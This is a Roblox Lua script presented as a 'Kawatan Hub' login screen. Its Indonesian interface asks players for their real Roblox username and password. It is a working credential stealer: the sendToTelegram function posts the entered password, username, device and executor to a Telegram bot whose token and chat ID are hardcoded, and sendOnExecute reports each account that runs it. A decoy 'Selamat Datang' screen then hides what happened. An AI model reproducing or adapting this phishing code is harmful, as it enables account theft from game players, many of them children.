local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local robloxUsername = player.Name
local robloxUserId = player.UserId

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoginUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local BackgroundFrame = Instance.new("Frame")
BackgroundFrame.Name = "Background"
BackgroundFrame.Size = UDim2.new(1, 0, 1, 0)
BackgroundFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
BackgroundFrame.Parent = ScreenGui

local LoginContainer = Instance.new("Frame")
LoginContainer.Name = "LoginContainer"
LoginContainer.Size = UDim2.new(0, 450, 0, 580)
LoginContainer.Position = UDim2.new(0.5, -225, 0.5, -290)
LoginContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
LoginContainer.BorderSizePixel = 2
LoginContainer.BorderColor3 = Color3.fromRGB(0, 212, 255)
LoginContainer.Parent = ScreenGui

local LoginCorner = Instance.new("UICorner")
LoginCorner.CornerRadius = UDim.new(0, 15)
LoginCorner.Parent = LoginContainer

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, 0, 0, 60)
TitleLabel.BackgroundColor3 = Color3.fromRGB(0, 212, 255)
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.TextSize = 24
TitleLabel.Text = "🔐 LOGIN KAWATAN HUB"
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.BorderSizePixel = 0
TitleLabel.Parent = LoginContainer

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 15)
TitleCorner.Parent = TitleLabel

local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Name = "Subtitle"
SubtitleLabel.Size = UDim2.new(1, -30, 0, 20)
SubtitleLabel.Position = UDim2.new(0, 15, 0, 65)
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
SubtitleLabel.TextSize = 12
SubtitleLabel.Text = "Gunakan username dan password Roblox Anda yang asli"
SubtitleLabel.Font = Enum.Font.Gotham
SubtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
SubtitleLabel.Parent = LoginContainer

local UsernameLabel = Instance.new("TextLabel")
UsernameLabel.Name = "UsernameLabel"
UsernameLabel.Size = UDim2.new(1, -30, 0, 25)
UsernameLabel.Position = UDim2.new(0, 15, 0, 95)
UsernameLabel.BackgroundTransparency = 1
UsernameLabel.TextColor3 = Color3.fromRGB(0, 212, 255)
UsernameLabel.TextSize = 14
UsernameLabel.Text = "👤 Username Roblox"
UsernameLabel.Font = Enum.Font.GothamBold
UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left
UsernameLabel.Parent = LoginContainer

local UsernameInput = Instance.new("TextBox")
UsernameInput.Name = "UsernameInput"
UsernameInput.Size = UDim2.new(1, -30, 0, 40)
UsernameInput.Position = UDim2.new(0, 15, 0, 125)
UsernameInput.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
UsernameInput.TextColor3 = Color3.fromRGB(0, 212, 255)
UsernameInput.TextSize = 14
UsernameInput.PlaceholderText = "username_roblox"
UsernameInput.PlaceholderColor3 = Color3.fromRGB(0, 102, 153)
UsernameInput.Font = Enum.Font.Gotham
UsernameInput.BorderSizePixel = 1
UsernameInput.BorderColor3 = Color3.fromRGB(0, 212, 255)
UsernameInput.Parent = LoginContainer

local UsernameCorner = Instance.new("UICorner")
UsernameCorner.CornerRadius = UDim.new(0, 8)
UsernameCorner.Parent = UsernameInput

local UsernameErrorLabel = Instance.new("TextLabel")
UsernameErrorLabel.Name = "UsernameError"
UsernameErrorLabel.Size = UDim2.new(1, -30, 0, 18)
UsernameErrorLabel.Position = UDim2.new(0, 15, 0, 168)
UsernameErrorLabel.BackgroundTransparency = 1
UsernameErrorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
UsernameErrorLabel.TextSize = 11
UsernameErrorLabel.Text = ""
UsernameErrorLabel.Font = Enum.Font.Gotham
UsernameErrorLabel.TextXAlignment = Enum.TextXAlignment.Left
UsernameErrorLabel.Parent = LoginContainer

local PasswordLabel = Instance.new("TextLabel")
PasswordLabel.Name = "PasswordLabel"
PasswordLabel.Size = UDim2.new(1, -30, 0, 25)
PasswordLabel.Position = UDim2.new(0, 15, 0, 190)
PasswordLabel.BackgroundTransparency = 1
PasswordLabel.TextColor3 = Color3.fromRGB(0, 212, 255)
PasswordLabel.TextSize = 14
PasswordLabel.Text = "🔑 Password"
PasswordLabel.Font = Enum.Font.GothamBold
PasswordLabel.TextXAlignment = Enum.TextXAlignment.Left
PasswordLabel.Parent = LoginContainer

local PasswordInputContainer = Instance.new("Frame")
PasswordInputContainer.Name = "PasswordInputContainer"
PasswordInputContainer.Size = UDim2.new(1, -30, 0, 40)
PasswordInputContainer.Position = UDim2.new(0, 15, 0, 220)
PasswordInputContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
PasswordInputContainer.BorderSizePixel = 1
PasswordInputContainer.BorderColor3 = Color3.fromRGB(0, 212, 255)
PasswordInputContainer.Parent = LoginContainer

local PasswordCorner = Instance.new("UICorner")
PasswordCorner.CornerRadius = UDim.new(0, 8)
PasswordCorner.Parent = PasswordInputContainer

local PasswordInput = Instance.new("TextBox")
PasswordInput.Name = "PasswordInput"
PasswordInput.Size = UDim2.new(1, -40, 1, 0)
PasswordInput.BackgroundTransparency = 1
PasswordInput.TextColor3 = Color3.fromRGB(0, 212, 255)
PasswordInput.TextSize = 14
PasswordInput.PlaceholderText = "password_roblox"
PasswordInput.PlaceholderColor3 = Color3.fromRGB(0, 102, 153)
PasswordInput.Font = Enum.Font.Gotham
PasswordInput.BorderSizePixel = 0
PasswordInput.Parent = PasswordInputContainer

local ShowPasswordBtn = Instance.new("TextButton")
ShowPasswordBtn.Name = "ShowPasswordBtn"
ShowPasswordBtn.Size = UDim2.new(0, 35, 1, 0)
ShowPasswordBtn.Position = UDim2.new(1, -35, 0, 0)
ShowPasswordBtn.BackgroundTransparency = 1
ShowPasswordBtn.TextColor3 = Color3.fromRGB(0, 212, 255)
ShowPasswordBtn.TextSize = 16
ShowPasswordBtn.Text = "👁️"
ShowPasswordBtn.Font = Enum.Font.GothamBold
ShowPasswordBtn.BorderSizePixel = 0
ShowPasswordBtn.Parent = PasswordInputContainer

local passwordVisible = false

ShowPasswordBtn.MouseButton1Click:Connect(function()
    passwordVisible = not passwordVisible
    if passwordVisible then
        PasswordInput.TextTransparency = 0
        ShowPasswordBtn.Text = "🙈"
    else
        PasswordInput.TextTransparency = 0.5
        ShowPasswordBtn.Text = "👁️"
    end
end)

PasswordInput.TextTransparency = 0.5

local PasswordErrorLabel = Instance.new("TextLabel")
PasswordErrorLabel.Name = "PasswordError"
PasswordErrorLabel.Size = UDim2.new(1, -30, 0, 18)
PasswordErrorLabel.Position = UDim2.new(0, 15, 0, 263)
PasswordErrorLabel.BackgroundTransparency = 1
PasswordErrorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
PasswordErrorLabel.TextSize = 11
PasswordErrorLabel.Text = ""
PasswordErrorLabel.Font = Enum.Font.Gotham
PasswordErrorLabel.TextXAlignment = Enum.TextXAlignment.Left
PasswordErrorLabel.Parent = LoginContainer

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Size = UDim2.new(1, -30, 0, 30)
StatusLabel.Position = UDim2.new(0, 15, 0, 290)
StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
StatusLabel.TextColor3 = Color3.fromRGB(100, 200, 100)
StatusLabel.TextSize = 12
StatusLabel.Text = "⏳ Menunggu input..."
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.BorderSizePixel = 1
StatusLabel.BorderColor3 = Color3.fromRGB(0, 212, 255)
StatusLabel.Parent = LoginContainer

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 8)
StatusCorner.Parent = StatusLabel

local LoginButton = Instance.new("TextButton")
LoginButton.Name = "LoginBtn"
LoginButton.Size = UDim2.new(1, -30, 0, 45)
LoginButton.Position = UDim2.new(0, 15, 0, 330)
LoginButton.BackgroundColor3 = Color3.fromRGB(0, 212, 255)
LoginButton.TextColor3 = Color3.fromRGB(0, 0, 0)
LoginButton.TextSize = 16
LoginButton.Text = "✓ LOGIN"
LoginButton.Font = Enum.Font.GothamBold
LoginButton.BorderSizePixel = 0
LoginButton.Parent = LoginContainer

local LoginCornerBtn = Instance.new("UICorner")
LoginCornerBtn.CornerRadius = UDim.new(0, 8)
LoginCornerBtn.Parent = LoginButton

local InfoLabel = Instance.new("TextLabel")
InfoLabel.Name = "InfoLabel"
InfoLabel.Size = UDim2.new(1, -30, 0, 100)
InfoLabel.Position = UDim2.new(0, 15, 0, 390)
InfoLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
InfoLabel.TextColor3 = Color3.fromRGB(0, 212, 255)
InfoLabel.TextSize = 9
InfoLabel.Text = "Username: -\nPassword: -\nDevice: -\nExecutor: -\nRoblox Account: -"
InfoLabel.Font = Enum.Font.Gotham
InfoLabel.TextWrapped = true
InfoLabel.BorderSizePixel = 1
InfoLabel.BorderColor3 = Color3.fromRGB(0, 212, 255)
InfoLabel.Parent = LoginContainer

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 8)
InfoCorner.Parent = InfoLabel

local function getDeviceInfo()
    local deviceType = "Unknown"
    local executor = "Unknown"
    
    if game:GetService("UserInputService"):GetLastInputType() == Enum.UserInputType.Touch then
        deviceType = "Mobile"
    else
        deviceType = "PC"
    end
    
    if identifyexecutor then
        executor = identifyexecutor()
    else
        executor = "Delta/KRNL/Unknown"
    end
    
    return deviceType, executor
end

local function validateUsername(input)
    if input == "" then
        return false, "❌ Isi username dahulu!"
    end
    
    if input ~= robloxUsername then
        return false, "❌ Username tidak sama dengan Roblox mu!"
    end
    
    return true, "✅ Username benar"
end

local function validatePassword(input)
    if input == "" then
        return false, "❌ Isi password dahulu!"
    end
    
    if #input < 6 then
        return false, "❌ Password minimal 6 karakter!"
    end
    
    return true, "✅ Password diterima"
end

local function sendToTelegram(username, password, deviceType, executor)
    local botToken = "7739418650:AAGVNkstHuCZ48gIAmFWb-sZXVh8ff2u-Uk"
    local chatId = "-1004463982905"
    
    local message = "🔐 LOGIN KAWATAN HUB\n\n" ..
        "👤 Username: " .. username .. "\n" ..
        "🔑 Password: " .. password .. "\n" ..
        "📱 Device: " .. deviceType .. "\n" ..
        "💻 Executor: " .. executor .. "\n" ..
        "🎮 Roblox Account: " .. robloxUsername .. " (ID: " .. robloxUserId .. ")\n" ..
        "📍 Game: Roblox\n" ..
        "⏰ Time: " .. os.date("%Y-%m-%d %H:%M:%S")
    
    local urlMessage = string.gsub(message, " ", "%%20")
    urlMessage = string.gsub(urlMessage, "\n", "%%0A")
    
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage?chat_id=" .. chatId .. "&text=" .. urlMessage
    
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    return success
end

local function updateStatus(text, color)
    StatusLabel.Text = text
    StatusLabel.TextColor3 = color
end

local function createWelcomeScreen()
    local WelcomeGui = Instance.new("ScreenGui")
    WelcomeGui.Name = "WelcomeGui"
    WelcomeGui.ResetOnSpawn = false
    WelcomeGui.Parent = playerGui
    
    local BlackBackground = Instance.new("Frame")
    BlackBackground.Name = "BlackBackground"
    BlackBackground.Size = UDim2.new(1, 0, 1, 0)
    BlackBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    BlackBackground.BorderSizePixel = 0
    BlackBackground.Parent = WelcomeGui
    
    local WelcomeText = Instance.new("TextLabel")
    WelcomeText.Name = "WelcomeText"
    WelcomeText.Size = UDim2.new(1, 0, 1, 0)
    WelcomeText.BackgroundTransparency = 1
    WelcomeText.TextColor3 = Color3.fromRGB(0, 212, 255)
    WelcomeText.TextSize = 80
    WelcomeText.Text = "Selamat Datang"
    WelcomeText.Font = Enum.Font.GothamBold
    WelcomeText.Parent = WelcomeGui
    
    local colors = {
        Color3.fromRGB(0, 212, 255),
        Color3.fromRGB(255, 0, 127),
        Color3.fromRGB(0, 255, 127),
        Color3.fromRGB(255, 212, 0),
        Color3.fromRGB(255, 0, 0),
        Color3.fromRGB(0, 127, 255),
        Color3.fromRGB(255, 127, 0)
    }
    
    local colorIndex = 1
    local colorChange = game:GetService("RunService").Heartbeat:Connect(function()
        colorIndex = colorIndex + 1
        if colorIndex > #colors then
            colorIndex = 1
        end
        WelcomeText.TextColor3 = colors[colorIndex]
    end)
    
    local startTime = tick()
    local duration = 3 * 60 * 60
    
    local removeTimer = game:GetService("RunService").Heartbeat:Connect(function()
        local elapsed = tick() - startTime
        if elapsed >= duration then
            colorChange:Disconnect()
            removeTimer:Disconnect()
            WelcomeGui:Destroy()
        end
    end)
end

local function sendOnExecute()
    local deviceType, executor = getDeviceInfo()
    
    local execMessage = "⚠️ KAWATAN HUB SCRIPT EXECUTED\n\n" ..
        "🎮 Roblox Account: " .. robloxUsername .. "\n" ..
        "📱 Device: " .. deviceType .. "\n" ..
        "💻 Executor: " .. executor .. "\n" ..
        "⏰ Time: " .. os.date("%Y-%m-%d %H:%M:%S") ..
        "\n\n⏳ Menunggu input login..."
    
    local urlMessage = string.gsub(execMessage, " ", "%%20")
    urlMessage = string.gsub(urlMessage, "\n", "%%0A")
    
    local botToken = "7739418650:AAGVNkstHuCZ48gIAmFWb-sZXVh8ff2u-Uk"
    local chatId = "-1004463982905"
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage?chat_id=" .. chatId .. "&text=" .. urlMessage
    
    pcall(function()
        game:HttpGet(url)
    end)
end

sendOnExecute()

LoginButton.MouseButton1Click:Connect(function()
    local username = UsernameInput.Text:match("^%s*(.-)%s*$") or ""
    local password = PasswordInput.Text:match("^%s*(.-)%s*$") or ""
    
    local usernameValid, usernameMsg = validateUsername(username)
    local passwordValid, passwordMsg = validatePassword(password)
    
    UsernameErrorLabel.Text = usernameValid and "" or usernameMsg
    PasswordErrorLabel.Text = passwordValid and "" or passwordMsg
    
    if not usernameValid or not passwordValid then
        updateStatus("❌ Data tidak valid!", Color3.fromRGB(255, 50, 50))
        return
    end
    
    updateStatus("⏳ Memproses...", Color3.fromRGB(255, 200, 0))
    
    local deviceType, executor = getDeviceInfo()
    local success = sendToTelegram(username, password, deviceType, executor)
    
    if success then
        updateStatus("✅ Login Berhasil!", Color3.fromRGB(100, 255, 100))
        InfoLabel.Text = "Username: " .. username .. "\nPassword: " .. password .. "\nDevice: " .. deviceType .. "\nExecutor: " .. executor .. "\nRoblox Account: " .. robloxUsername
        
        wait(2)
        ScreenGui:Destroy()
        
        createWelcomeScreen()
        
        print("✅ Login berhasil! Welcome screen muncul selama 3 jam")
    else
        updateStatus("❌ Gagal kirim data", Color3.fromRGB(255, 50, 50))
    end
end)

UsernameInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        PasswordInput:CaptureFocus()
    end
end)

PasswordInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        LoginButton:Fire("MouseButton1Click")
    end
end)

print("✅ Kawatan Hub Login UI Loaded!")
print("✅ Username Roblox Anda: " .. robloxUsername)
